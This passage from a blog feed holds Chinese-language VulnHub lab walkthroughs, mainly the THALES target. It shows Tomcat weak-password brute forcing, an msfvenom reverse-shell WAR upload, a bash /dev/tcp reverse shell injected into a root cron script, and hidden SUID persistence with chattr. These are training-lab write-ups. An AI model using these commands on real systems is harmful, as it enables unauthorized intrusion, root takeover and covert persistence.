&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh -p 80 icex64@192.168.31.236&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-358.png&#34; width=&#34;490&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;从攻击机连接目标机器的 80 端口成功，此时 80 的网站我们将无法访问&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-359.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用其他 ip 访问此网站也是打不开的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-360.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;关闭复用&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.3.236 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nihao123leaving&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -p 80 icex64@192.168.31.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将不能通过 80 连接，并且网站恢复正常&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-361.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; iptables 端口复用成功，可在攻击机上执行 nc 192.168.3.236 80 即可来开启或者关闭对方的 80 网站，从而进入到目标主机&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/115%20THALES/</id>
        <title>VULNHUB 15 THALES</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/115%20THALES/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhhbGVzLTEsNzQ5Lw==&#34;&gt;https://www.vulnhub.com/entry/thales-1,749/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc4NDA1Ni9hcnRpY2xlL2RldGFpbHMvMTIzNTc3ODYy&#34;&gt;https://blog.csdn.net/weixin_43784056/article/details/123577862&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 THALES：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-307.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.109&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.109&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-308.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 8080&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 [&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5&#34;&gt;http://192.168.31.109&lt;/span&gt;](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5&#34;&gt;http://192.168.31.109&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-309.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;页面是一个普通的 tomcat 首页，没有直接可以点击的接口&lt;/p&gt;
&lt;p&gt;扫描目录  &lt;code&gt;dirsearch -u http://192.168.31.109:8080/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-310.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 对识别到的目录依次进行访问，找到了两个敏感目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==&#34;&gt;http://192.168.31.109/manager/html&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==&#34;&gt;http://192.168.31.109/shell/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;换一个字典，重新扫描看是否有没有被找到的目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.109:8080 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-311.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==&#34;&gt;http://192.168.31.109/shell/&lt;/span&gt;&lt;br&gt;
 是一个不停转圈的网站，猜测是作者遗留在此的一个后门文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-312.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==&#34;&gt;http://192.168.31.109/manager/html&lt;/span&gt; 登陆界面，可进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-313.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tomcat-弱口令爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tomcat-弱口令爆破&#34;&gt;#&lt;/a&gt; tomcat 弱口令爆破&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf对此登陆框进行弱口令尝试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/scanner/http/tomcat_mgr_login&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RHOSTS 192.168.31.109&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-314.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;较长时间后，获取到了正确的 tomcat 密码&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-315.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：tomcat 密码：role1&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5OjgwODAvbWFuYWdlci9odG1s&#34;&gt;http://192.168.31.109:8080/manager/html&lt;/span&gt; 存在一个文件上传的漏洞，可用来上传 war 后门文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-316.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;war-后门文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#war-后门文件上传&#34;&gt;#&lt;/a&gt; War 后门文件上传&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf生成一个反弹shell的war文件木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.31.135 LPORT=4444 -f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;war -o revshell.war&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同时监听 4444 端口，等待 shell 的反弹&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-317.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 war 文件上传到 tomcat 上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-318.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在网站上已经显示出了具体的 url 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-319.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击此文件执行此反弹 shell 的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-320.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了服务器上的网站的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-321.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;p&gt;查看 sudo -l 相关权限设置，查看是否有 s 权限设置错误&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-322.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看是否可以通过 pkexec 提权&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-323.png&#34; width=&#34;435&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;翻阅目录，查找敏感文件&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-324.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1ub3Rlcy12YjhqNjB6LnhuLS10eHRiYWNrdXAteDc1bm9vMjJmY2ExaDMwNHFkYzBiZ2RnZ2EzNDRlZTk1aC5zaA==&#34;&gt;根据 notes.txt 文件提示有一个备份文件 backup.sh&lt;/span&gt;，查看文件权限，发现所有者和组都是 root，所以应该是以 root 的身份在后台运行&lt;/p&gt;
&lt;p&gt;-&amp;gt; 可以使用 pspy64 脚本查看一下&lt;/p&gt;
&lt;h3 id=&#34;pspy64-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64-监控&#34;&gt;#&lt;/a&gt; pspy64 监控&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pspy64s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-325.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 pspy 监视正在运行的进程，发现有 UID=0 执行的程序，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2JhY2t1cC5zaA==&#34;&gt;backup.sh&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-326.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以将反弹root终端的代码插入到backup.sh中，监听相应端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看文件的最后两行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tail -n 2 /usr/local/bin/backup.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-327.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待 shell 被反弹&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-328.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
&lt;p&gt;查看一下计划任务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看定时任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;crontab -l &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现是 5 分钟备份一次&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/5 * * * * bash /usr/local/bin/backup.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;suid-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-权限维持&#34;&gt;#&lt;/a&gt; SUID 权限维持&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新增用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd kali &amp;amp;&amp;amp; passwd kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新增SUID文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /var/.hack &amp;amp;&amp;amp; chmod 4755 /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;chattr锁定文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh /var/.hack &amp;amp;&amp;amp; chattr +i /var/.hack &amp;amp;&amp;amp; rm -f /var/.hack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-329.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检验是否权限维持成功&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-330.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;chattr-锁定文件权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chattr-锁定文件权限&#34;&gt;#&lt;/a&gt; chattr 锁定文件权限&lt;/h3&gt;
&lt;p&gt;在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;锁定文件&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chattr +i evil.php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;属性查看&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lsattr evil.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解除锁定&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chattr -i evil.php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;删除文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -rf 1.evil.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;chattr 锁定权限，通过解锁才能删除&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/119%20THOR/</id>
        <title>VULNHUB 19 THOR</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/119%20THOR/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tdGhvciw3MzMv&#34;&gt;https://www.vulnhub.com/entry/hacksudo-thor,733/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDE0NTIuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15801452.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 THOR：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-423.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看靶机所在 win 主机的 ip 地址&lt;br&gt;
 &lt;code&gt;ipconfig | find “192.168.31”&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-424.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;与主机同一 MAC 地址的 ip 地址即为靶机 IP&lt;/p&gt;
&lt;p&gt;也可以登陆路由器后台，查看 win 主机上的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-425.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;显示有 win 上所有存在过的 ip 地址，以及其 MAC 地址&lt;br&gt;
 -&amp;gt; 靶机 ip：192.168.31.115&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.115&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-426.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE1&#34;&gt;http://192.168.31.115&lt;/span&gt; 进行信息收集&lt;/p&gt;
